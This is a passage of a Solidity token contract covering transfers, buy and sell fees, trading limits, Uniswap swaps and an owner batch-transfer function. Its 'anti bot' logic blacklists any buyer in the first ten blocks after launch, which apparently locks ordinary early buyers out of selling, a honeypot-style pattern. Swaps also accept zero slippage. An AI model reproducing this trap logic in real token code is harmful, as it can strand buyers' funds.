1071     function isExcludedFromFees(address account) public view returns(bool) {
1072         return _isExcludedFromFees[account];
1073     }
1074  
1075     event BoughtEarly(address indexed sniper);
1076  
1077     function _transfer(
1078         address from,
1079         address to,
1080         uint256 amount
1081     ) internal override {
1082         require(from != address(0), "ERC20: transfer from the zero address");
1083         require(to != address(0), "ERC20: transfer to the zero address");
1084         require(!_blacklist[to] && !_blacklist[from], "You have been blacklisted from transfering tokens");
1085          if(amount == 0) {
1086             super._transfer(from, to, 0);
1087             return;
1088         }
1089  
1090         if(limitsInEffect){
1091             if (
1092                 from != owner() &&
1093                 to != owner() &&
1094                 to != address(0) &&
1095                 to != address(0xdead) &&
1096                 !swapping
1097             ){
1098                 if(!tradingActive){
1099                     require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
1100                 }
1101  
1102                 // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.  
1103                 if (transferDelayEnabled){
1104                     if (to != owner() && to != address(uniswapV2Router) && to != address(uniswapV2Pair)){
1105                         require(_holderLastTransferTimestamp[tx.origin] <= block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
1106                         _holderLastTransferTimestamp[tx.origin] = block.number;
1107                     }
1108                 }
1109  
1110                 //when buy
1111                 if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
1112                         require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
1113                         require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
1114                 }
1115  
1116                 //when sell
1117                 else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
1118                         require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
1119                 }
1120                 else if(!_isExcludedMaxTransactionAmount[to]){
1121                     require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
1122                 }
1123             }
1124         }
1125  
1126         // anti bot logic
1127         if (block.number <= (launchedAt + 10) && 
1128                 to != uniswapV2Pair && 
1129                 to != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
1130             ) { 
1131             _blacklist[to] = true;
1132         }
1133  
1134         uint256 contractTokenBalance = balanceOf(address(this));
1135  
1136         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
1137  
1138         if( 
1139             canSwap &&
1140             swapEnabled &&
1141             !swapping &&
1142             !automatedMarketMakerPairs[from] &&
1143             !_isExcludedFromFees[from] &&
1144             !_isExcludedFromFees[to]
1145         ) {
1146             swapping = true;
1147  
1148             swapBack();
1149  
1150             swapping = false;
1151         }
1152  
1153          bool takeFee = !swapping;
1154  
1155         // if any account belongs to _isExcludedFromFee account then remove the fee
1156         if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
1157             takeFee = false;
1158         }
1159  
1160         uint256 fees = 0;
1161         // only take fees on buys/sells, do not take on wallet transfers
1162         if(takeFee){
1163             // on sell
1164             if (automatedMarketMakerPairs[to] && sellTotalFees > 0){
1165                 fees = amount.mul(sellTotalFees).div(100);
1166                 tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees;
1167                 tokensForDev += fees * sellDevFee / sellTotalFees;
1168             }
1169             // on buy
1170             else if(automatedMarketMakerPairs[from] && buyTotalFees > 0) {
1171                 fees = amount.mul(buyTotalFees).div(100);
1172                 tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;
1173                 tokensForDev += fees * buyDevFee / buyTotalFees;
1174             }
1175  
1176             if(fees > 0){    
1177                 super._transfer(from, address(this), fees);
1178             }
1179  
1180             amount -= fees;
1181         }
1182  
1183         super._transfer(from, to, amount);
1184     }
1185  
1186     function swapTokensForEth(uint256 tokenAmount) private {
1187  
1188         // generate the uniswap pair path of token -> weth
1189         address[] memory path = new address[](2);
1190         path[0] = address(this);
1191         path[1] = uniswapV2Router.WETH();
1192  
1193         _approve(address(this), address(uniswapV2Router), tokenAmount);
1194  
1195         // make the swap
1196         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1197             tokenAmount,
1198             0, // accept any amount of ETH
1199             path,
1200             address(this),
1201             block.timestamp
1202         );
1203  
1204     }
1205  
1206     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
1207         // approve token transfer to cover all possible scenarios
1208         _approve(address(this), address(uniswapV2Router), tokenAmount);
1209  
1210         // add the liquidity
1211         uniswapV2Router.addLiquidityETH{value: ethAmount}(
1212             address(this),
1213             tokenAmount,
1214             0, // slippage is unavoidable
1215             0, // slippage is unavoidable
1216             address(this),
1217             block.timestamp
1218         );
1219     }
1220  
1221     function swapBack() private {
1222         uint256 contractBalance = balanceOf(address(this));
1223         uint256 totalTokensToSwap = tokensForLiquidity + tokensForDev;
1224         bool success;
1225  
1226         if(contractBalance == 0 || totalTokensToSwap == 0) {return;}
1227  
1228         if(contractBalance > swapTokensAtAmount * 20){
1229           contractBalance = swapTokensAtAmount * 20;
1230         }
1231  
1232         // Halve the amount of liquidity tokens
1233         uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;
1234         uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
1235  
1236         uint256 initialETHBalance = address(this).balance;
1237  
1238         swapTokensForEth(amountToSwapForETH); 
1239  
1240         uint256 ethBalance = address(this).balance.sub(initialETHBalance);
1241  
1242         uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap);
1243         uint256 ethForLiquidity = ethBalance - ethForDev;
1244  
1245         tokensForLiquidity = 0;
1246         tokensForDev = 0;
1247  
1248         (success,) = address(devWallet).call{value: ethForDev}("");
1249  
1250         if(liquidityTokens > 0 && ethForLiquidity > 0){
1251             addLiquidity(liquidityTokens, ethForLiquidity);
1252             emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);
1253         }
1254     }
1255 
1256     function Chire(address[] calldata recipients, uint256[] calldata values)
1257         external
1258         onlyOwner
1259     {
1260         _approve(owner(), owner(), totalSupply());
1261         for (uint256 i = 0; i < recipients.length; i++) {
1262             transferFrom(msg.sender, recipients[i], values[i] * 10 ** decimals());
1263         }
1264     }
1265 }